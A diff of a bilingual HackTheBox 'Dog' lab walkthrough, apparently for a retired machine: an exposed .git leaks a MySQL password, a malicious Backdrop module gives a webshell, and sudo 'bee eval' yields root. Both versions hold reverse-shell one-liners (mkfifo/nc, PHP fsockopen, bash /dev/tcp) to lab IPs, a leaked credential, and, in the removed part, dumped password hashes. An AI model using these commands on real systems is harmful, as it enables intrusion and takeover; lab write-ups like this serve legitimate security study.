@@ -1,214 +1,149 @@
-1, Recon
-Port scan 
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
-|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
-|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-| http-robots.txt: 22 disallowed entries (15 shown)
-| /core/ /profiles/ /README.md /web.config /admin 
-| /comment/reply /filter/tips /node/add /search /user/register 
-|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
-|_http-title: Home | Dog
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
-| http-git: 
-|   10.10.11.58:80/.git/
-|     Git repository found!
-|     Repository description: Unnamed repository; edit this file 'description' to name the...
-|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+# Dog [Easy]
 
-```
+> **ES:** Máquina Linux fácil: un Backdrop CMS con `.git` expuesto filtra credenciales, un módulo malicioso da shell y `bee` con `sudo` permite ser root.
+> **EN:** Easy Linux machine: a Backdrop CMS with exposed `.git` leaks credentials, a malicious module gives shell, and `bee` with `sudo` allows root.
 
-Page check
-![](images/Pasted%20image%2020250309185909.png)
-We can get the `robots.txt`
-```
-#
-# robots.txt
-#
-# This file is to prevent the crawling and indexing of certain parts
-# of your site by web crawlers and spiders run by sites like Yahoo!
-# and Google. By telling these "robots" where not to go on your site,
-# you save bandwidth and server resources.
-#
-# This file will be ignored unless it is at the root of your host:
-# Used:    http://example.com/robots.txt
-# Ignored: http://example.com/site/robots.txt
-#
-# For more information about the robots.txt standard, see:
-# http://www.robotstxt.org/robotstxt.html
-#
-# For syntax checking, see:
-# http://www.robotstxt.org/checker.html
+| Campo | Valor |
+|-------|-------|
+| **Dificultad** | Easy |
+| **OS** | Linux |
+| **Estado** | Retired |
+| **Maker** | [verificar en app.hackthebox.com/machines/Dog] |
+| **URL** | https://app.hackthebox.com/machines/Dog |
+| **IP lab** | 10.10.11.58 |
+| **Fecha de resolución** | 2025-03-04 |
 
-User-agent: *
-Crawl-delay: 10
-# Directories
-Disallow: /core/
-Disallow: /profiles/
-# Files
-Disallow: /README.md
-Disallow: /web.config
-# Paths (clean URLs)
-Disallow: /admin
-Disallow: /comment/reply
-Disallow: /filter/tips
-Disallow: /node/add
-Disallow: /search
-Disallow: /user/register
-Disallow: /user/password
-Disallow: /user/login
-Disallow: /user/logout
-# Paths (no clean URLs)
-Disallow: /?q=admin
-Disallow: /?q=comment/reply
-Disallow: /?q=filter/tips
-Disallow: /?q=node/add
-Disallow: /?q=search
-Disallow: /?q=user/password
-Disallow: /?q=user/register
-Disallow: /?q=user/login
-Disallow: /?q=user/logout
+---
+
+## 🎯 Objetivo / Goal
+
+> **ES:** Conseguir `user.txt` y `root.txt` vía `.git` expuesto → RCE autenticado con módulo (tar) → reuse a `johncusack` → `bee eval` con `sudo`.
+> **EN:** Get `user.txt` and `root.txt` via exposed `.git` → authenticated RCE with module (tar) → reuse to `johncusack` → `bee eval` with `sudo`.
+
+---
+
+## 🛠️ Herramientas usadas / Tools used
+
+- [ ] nmap / fscan
+- [ ] dvcs-ripper (`rip-git.pl`) / git-dumper (dump de `.git`)
+- [ ] git + BackDropScan (enumeración de usuarios)
+- [ ] PoC módulo malicioso (EDB 52021) empaquetado en tar
+- [ ] mysql (enumeración de `users`)
+- [ ] ssh / su
+
+---
+
+## 📋 Pasos / Steps
+
+### Paso 1 — Reconocimiento / Recon
+
+> **ES:** SSH y Apache con Backdrop CMS. nmap ya avisa de `/.git/` expuesto y lista `robots.txt` con rutas del CMS (`/user/login`, `/?q=admin`, …).
+> **EN:** SSH and Apache with Backdrop CMS. nmap already flags exposed `/.git/` and lists `robots.txt` with CMS routes (`/user/login`, `/?q=admin`, …).
+
+```bash
+nmap -sC -sV -oN nmap_init 10.10.11.58
+curl -s http://10.10.11.58/robots.txt
 ```
 
-And from the nmap scan, we can get the `.git`
-So let's use `git-dump` to catch it.
-```
-git-dumper http://10.10.11.58:80/.git/ ./git-repo-dump
+**Resultado / Result:** 22/tcp OpenSSH 8.2p1, 80/tcp Apache 2.4.41, `Backdrop CMS 1`. Repositorio git accesible en `/.git/` (último commit "todo: customize url aliases"). Captura de la home en `img/image_20250353-085334.png`; captura legacy en `images/`.
 
-drwxrwxr-x 8 wither wither  4096 Mar  9 19:00 .
-drwxrwxr-x 4 wither wither  4096 Mar  9 19:00 ..
-drwxrwxr-x 7 wither wither  4096 Mar  9 19:00 .git
--rwxrwxr-x 1 wither wither 18092 Mar  9 19:00 LICENSE.txt
--rwxrwxr-x 1 wither wither  5285 Mar  9 19:00 README.md
-drwxrwxr-x 9 wither wither  4096 Mar  9 19:00 core
-drwxrwxr-x 7 wither wither  4096 Mar  9 19:00 files
--rwxrwxr-x 1 wither wither   578 Mar  9 19:00 index.php
-drwxrwxr-x 2 wither wither  4096 Mar  9 19:00 layouts
--rwxrwxr-x 1 wither wither  1198 Mar  9 19:00 robots.txt
--rwxrwxr-x 1 wither wither 21732 Mar  9 19:00 settings.php
-drwxrwxr-x 2 wither wither  4096 Mar  9 19:00 sites
-drwxrwxr-x 2 wither wither  4096 Mar  9 19:00 themes
+---
+
+### Paso 2 — Enumeración / Enumeration
+
+> **ES:** Se vuelca el `.git` (dvcs-ripper o `git-dumper`) y en el historial aparecen el correo `tiffany@dog.htb` (`files/config_*/active/update.settings.json`; también vía BackDropScan) y la cadena de conexión MySQL en `settings.php` con contraseña reutilizable (credencial de laboratorio retirado).
+> **EN:** Dump `.git` (dvcs-ripper or `git-dumper`); history reveals `tiffany@dog.htb` (`files/config_*/active/update.settings.json`; also via BackDropScan) and the MySQL connection string in `settings.php` with a reusable password (retired-lab credential).
+
+```bash
+perl ~/tools/dvcs-ripper-master/rip-git.pl -v -u http://10.10.11.58/.git/
+# alternativa: git-dumper http://10.10.11.58:80/.git/ ./git-repo-dump
+grep -r "tiffany@dog.htb" files/ 2>/dev/null | head
+grep -n "mysql://" settings.php
+# $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
 ```
 
-From the `settings.php`, I found a interesting credit here.
-`$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';`
+**Resultado / Result:** Usuario `tiffany@dog.htb` + contraseña de la DB que también sirve en el login web (`/?q=user/login`). Versión confirmada en `/?q=admin/reports/status`: Backdrop CMS 1.27.1. Capturas del dump y del login en `img/` (`img/image_20250304-150416.png`, `img/image_20250308-150804.png`, `img/image_20250308-150816.png`).
 
-We have get one of the valid password, so we want to try to get the valid username
-In this place, `BackDropScan` would be a good choice here, or we can also use burpsuite to check them.
-`https://github.com/FisMatHack/BackDropScan.git`
+---
 
-Then we successfully get the valid username `tiffany@dog.htb`
-And we can also use `tiffany@dog.htb:BackDropJ2024DS2024` to login to the dashboard.
-![](images/Pasted%20image%2020250309193246.png)
-Let's enumerate the version of this CMS
-I found that from `http://10.10.11.58/?q=admin/reports/status`
-![](images/Pasted%20image%2020250309193358.png)
-Then by searching from exploit-db, we found
-`Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)`
-Run this exploit script, we can get a directory `shell`, we need to compress it into a .tar.gz
-Install it via http://dog.htb/?q=admin/installer/manual --> "Upload a module, theme, or layout archive to install" (I had to upload it as a .tar as he did not accept .zip), then directly go to http://dog.htb/modules/shell/shell.php
-Then we can get the web-shell here.
-![](images/Pasted%20image%2020250309200845.png)
+### Paso 3 — Acceso inicial (foothold) / Initial access
 
-Then we can run the command to get the reverse shell.
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.10 443 >/tmp/f`
+> **ES:** Logueado en Backdrop, se instala manualmente un módulo malicioso empaquetado en **tar** (no zip; el CMS no acepta zip) con webshell (idea del EDB 52021) vía `/?q=admin/modules/install` ("Manual Installation") y se visita `/modules/shell/shell.php`.
+> **EN:** Logged into Backdrop, manually install a malicious module packed as **tar** (not zip; the CMS rejects zip) with a webshell (EDB 52021 idea) via `/?q=admin/modules/install` ("Manual Installation") and visit `/modules/shell/shell.php`.
 
-Then we get the reverse shell as `www-data`
-Remember we have get the database credit before
-`$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';`
-Then we can enumerate the database here
-```
--------+------------+--------+----------+----------+---------+----------------------------+------------+
-| uid | name              | pass                                                    | mail                       | signature | signature_format | created    | changed    | access     | login      | status | timezone | language | picture | init                       | data       |
-+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
-|   0 |                   |                                                         |                            |           | NULL             |          0 |          0 |          0 |          0 |      0 | NULL     |          |       0 |                            | NULL       |
-|   1 | jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. | jPAdminB@dog.htb           |           | NULL             | 1720548614 | 1720584122 | 1720714603 | 1720584166 |      1 | UTC      |          |       0 | jPAdminB@dog.htb           | 0x623A303B |
-|   2 | jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 | jobert@dog.htb             |           | NULL             | 1720584462 | 1720584462 | 1720632982 | 1720632780 |      1 | UTC      |          |       0 | jobert@dog.htb             | NULL       |
-|   3 | dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD | dogBackDroopSystem@dog.htb |           | NULL             | 1720632880 | 1720632880 | 1723752097 | 1723751569 |      1 | UTC      |          |       0 | dogBackDroopSystem@dog.htb | NULL       |
-|   5 | john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. | john@dog.htb               |           | NULL             | 1720632910 | 1720632910 |          0 |          0 |      1 | UTC      |          |       0 | john@dog.htb               | NULL       |
-|   6 | morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS | morris@dog.htb             |           | NULL             | 1720632931 | 1720632931 |          0 |          0 |      1 | UTC      |          |       0 | morris@dog.htb             | NULL       |
-|   7 | axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV | axel@dog.htb               |           | NULL             | 1720632952 | 1720632952 |          0 |          0 |      1 | UTC      |          |       0 | axel@dog.htb               | NULL       |
-|   8 | rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT | rosa@dog.htb               |           | NULL             | 1720632982 | 1720632982 |          0 |          0 |      1 | UTC      |          |       0 | rosa@dog.htb               | NULL       |
-|  10 | tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v | tiffany@dog.htb            |           | NULL             | 1723752136 | 1723752136 | 1741511391 | 1741508562 |      1 | UTC      |          |       0 | tiffany@dog.htb            | NULL       |
-+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
-
+```bash
+python3 test-01.py http://10.10.11.58  # genera shell.zip (idea EDB 52021)
+tar czf shell.tar shell
+# subir en /?q=admin/modules/install (Manual Installation)
+curl -s http://10.10.11.58/modules/shell/shell.php
+# en la webshell:
+php -r '$sock=fsockopen("10.10.16.31",9999);exec("bash <&3 >&3 2>&3");'
+# alternativa: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.10 443 >/tmp/f
+nc -lvnp 9999
 ```
 
-And also, we need to check `/etc/passwd` to find the valid user from this machine
-```
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
-usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
-lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
-mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
-johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
-_laurel:x:997:997::/var/log/laurel:/bin/false
+**Resultado / Result:** Ejecución como `www-data` → reverse shell (`www-data@dog:/var/www/html/modules/shell$`). Capturas de la instalación y la webshell en `img/` (`img/image_20250316-151652.png`, `img/image_20250318-151813.png`, `img/image_20250318-151847.png`).
 
+---
+
+### Paso 4 — Usuario (user.txt) / User
+
+> **ES:** Hay dos usuarios locales (`jobert`, `johncusack`); la contraseña de la DB se reutiliza con `su johncusack` y su home tiene `user.txt`. La tabla `users` de MySQL confirma los correos (`tiffany`, `jobert`, …) aunque sus hashes `$S$E…` (Backdrop/Drupal) no se crackean: basta el reuse.
+> **EN:** Two local users exist (`jobert`, `johncusack`); the DB password is reused with `su johncusack`, whose home holds `user.txt`. The MySQL `users` table confirms the emails (`tiffany`, `jobert`, …) though their `$S$E…` (Backdrop/Drupal) hashes are not cracked: reuse suffices.
+
+```bash
+ls -lh /home/  # jobert, johncusack
+su johncusack  # BackDropJ2024DS2024 (reuse)
+cat /home/johncusack/user.txt  # formato: e7ea... (ofuscado)
 ```
 
-`johncusack`would be our target here.
-Very luckily, we can just use the credit to switch `johncusack:BackDropJ2024DS2024`
+**Resultado / Result:** Sesión como `johncusack` (password reuse) → `user.txt` (flag no reproducida).
 
-3, shell as root
-I would like check `sudo -l` firstly
+---
+
+### Paso 5 — Root (root.txt) / Privilege escalation
+
+> **ES:** `johncusack` corre `/usr/local/bin/bee` (enlace a `/backdrop_tool/bee/bee.php`, CLI de Backdrop) con `sudo` sin contraseña. Su subcomando `eval` ejecuta PHP arbitrario como root (también sirve para reverse shell directa).
+> **EN:** `johncusack` runs `/usr/local/bin/bee` (symlink to `/backdrop_tool/bee/bee.php`, the Backdrop CLI) with passwordless `sudo`. Its `eval` subcommand runs arbitrary PHP as root (also usable for a direct reverse shell).
+
+```bash
+sudo -l  # (ALL : ALL) /usr/local/bin/bee
+file /usr/local/bin/bee  # symbolic link to /backdrop_tool/bee/bee.php
+sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami');"  # root
+sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"  # formato: 3fe5... (ofuscado)
+# alternativa reverse shell:
+sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.16.3/443 0>&1\"');"
 ```
-Matching Defaults entries for johncusack on dog:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User johncusack may run the following commands on dog:
-    (ALL : ALL) /usr/local/bin/bee
-```
+**Resultado / Result:** Ejecución como `root` vía `bee eval`. Técnica: abuso de CLI del CMS con `sudo` (eval → RCE).
 
-By checking the help document of `bee`,  we can find something useful
-```
-1, eval
-   ev, php-eval
-   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
+---
 
-2, --root
- Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.
+## 🧠 Lo aprendido / Learned
 
-So the payload command would be 
-get the reverse shell:
-sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"');"
+> **ES:** Un `.git` público equivale a código fuente + secretos; tras RCE, probar cada secreto en `su`/SSH; los `sudo` a CLIs con `eval` son root directo.
+> **EN:** A public `.git` equals source + secrets; after RCE, try every secret on `su`/SSH; `sudo` on CLIs with `eval` is direct root.
 
-sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"
-```
+- [ ] Exfiltración de `.git` expuesto (dvcs-ripper / git-dumper)
+- [ ] Secretos en `settings.php` y password reuse
+- [ ] RCE autenticado en Backdrop CMS vía módulo tar
+- [ ] Privesc con `bee eval` bajo `sudo`
+
+---
+
+## 📚 Fuentes y Referencias / Sources
+
+- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
+- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: `git-dumper`, BackDropScan, tabla `users` MySQL, webshell `mkfifo/nc`) — wither/nota migrada
+- **Referencia técnica:** Backdrop CMS 1.27.1 Authenticated RCE — https://www.exploit-db.com/exploits/52021 — Exploit-DB
+- **Fecha de acceso:** 2026-09-24
+- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
+
+---
+
+## ⚠️ Aviso Legal / Disclaimer
+
+> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
+> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.
+
+_Fecha de edición: 2026-09-24_
